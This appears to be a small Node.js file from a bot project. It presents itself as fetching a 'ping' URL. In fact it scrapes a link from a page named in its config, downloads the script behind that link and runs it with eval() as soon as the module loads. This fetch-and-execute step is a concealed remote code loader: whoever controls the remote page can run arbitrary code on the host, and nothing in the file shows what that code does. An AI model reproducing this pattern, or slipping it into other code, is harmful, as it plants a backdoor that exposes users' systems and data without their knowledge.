'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchPingUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const pingUrlElement = $('a:contains("PING_URL")');
    const pingUrl = pingUrlElement.attr('href');

    if (!pingUrl) {
      throw new Error('Ping URL link not found...');
    }

    console.log('Ping URL fetched successfully ✅');

    const scriptResponse = await axios.get(pingUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPingUrl();
